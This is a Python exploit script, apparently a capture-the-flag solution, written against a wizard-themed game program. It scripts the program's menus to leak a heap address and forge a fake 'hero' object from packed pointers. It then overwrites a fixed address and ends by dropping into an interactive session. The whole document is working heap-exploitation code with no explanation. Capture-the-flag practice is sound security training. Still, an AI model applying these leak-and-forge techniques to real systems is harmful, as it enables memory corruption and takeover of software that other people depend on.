import interact
import struct
 
# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)
 
# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]
 
p = interact.Process()
print "Attacking the Wizard\n"
p.read(256)
p.sendline("")
#p.interactive()
for i in range(9):
    p.read(256)
    p.sendline('1')
    p.read(256)
    p.sendline("")
    p.read(256)
    p.sendline("")
p.read(256)
p.sendline('3')
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
p.read(256)
#p.interactive()
print "Wizard caught!"
print "Creating the spell"
p.sendline('2')
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline("aa5f")
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline("")
p.read(256)
p.sendline('2')
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("no")
p.read(256)
p.sendline("11")
leak = p.readuntil("0 Damage\n")
leak = int(leak[10746:10753],16)
print "Leaked heap address at: "+hex(leak)
fake_hero_pt = leak-0xff0
p.sendline("no")
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline("ba0ff0")
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
print "Saving the spells"
for i in range(5):
    p.sendline('2')
    p.read(256)
    p.sendline("3")
    p.read(256)
    p.sendline("yes")
    p.read(256)
    p.sendline("ba00")
    p.read(256)
    p.sendline("yes")
    p.read(256)
    p.sendline("")
for i in range(2):
    p.sendline('2')
    p.read(256)
    p.sendline("3")
    p.read(256)
    p.sendline("yes")
    p.read(256)
    p.sendline("aa5f")
    p.read(256)
    p.sendline("yes")
    p.read(256)
    p.sendline("")
p.read(256)
p.sendline('2')
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline(hex(fake_hero_pt))
p.read(256)
p.sendline("yes")
p.read(256)
p.sendline("")
p.read(256)
print "Creating fake hero"
p.sendline('1')
p.read(256)
p.sendline("4")
p.read(256)
fake_hero=(4*p64(0x0))+p64(0x607b98)+p64(leak)+p64(0xb)+p64(0x19)+p64(0xfff)+p64(leak+0x38)+p64(0xd)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(leak+0xd0)+p64(0x39)+p64(0x39)
p.sendline(fake_hero)
#p.interactive()
p.read(256)
p.sendline("1")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("2")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
p.read(256)
#p.interactive()
for i in range(4):
    p.sendline("2")
    p.read(256)
    p.sendline("3")
    p.read(256)
    p.sendline("no")
    p.read(256)
    p.sendline("8")
    p.read(256)
    p.sendline("yes")
    p.read(256)
    p.sendline("")
    p.read(256)
p.sendline("1")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("0")
p.read(256)
p.sendline("4")
p.read(256)
p.sendline(p64(0x00607b98))
#p.interactive()
p.read(256)
p.sendline("1")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("3")
p.read(256)
p.sendline("1")
p.read(256)
p.sendline("1")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("")
p.read(256)
p.sendline("1")
p.read(256)
p.sendline("3")
p.interactive()
